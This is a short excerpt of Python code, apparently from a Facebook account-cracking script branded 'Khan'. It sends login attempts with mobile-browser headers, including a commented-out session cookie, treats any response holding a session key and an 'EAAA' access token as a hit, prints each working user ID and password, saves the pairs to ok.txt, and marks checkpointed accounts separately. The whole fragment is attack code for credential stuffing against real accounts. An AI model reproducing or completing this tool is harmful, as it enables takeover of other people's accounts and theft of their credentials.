...
    # 'cookie': 'datr=1ij2ZF6ufnqb4KiHG94AgQ6U; sb=1ij2ZJuA-6bmAWqmLUGkecMq; m_pixel_ratio=2; wd=360x666; fr=0cgJZlCh8evosUM6M..Bk9ijW.hO.AAA.0.0.Bk9ijb.AWUWGHt_dho',
    'dpr': '2',
...
    'viewport-width': '980',}
                         ...
                         if "session_key" in response.text and "EAAA" in response.text: 
                                 print("\r  \033[0;97m   [=Khan=OK=>] %s | %s\033[0;97m         "%(uid, pw)) 
                                 self.ok.append("%s|%s"%(uid, pw)) 
                                 open("ok.txt","a").write("   [=Khan=OK=>]  %s|%s\n"%(uid, pw)) 
                                 break 
                         elif "www.facebook.com" in response.json()["error_msg"]: 
                                 print("\r  \033[0;92m   [=Khan=CP=>] %s | %s\033[0;97m         "%(uid, pw)) 
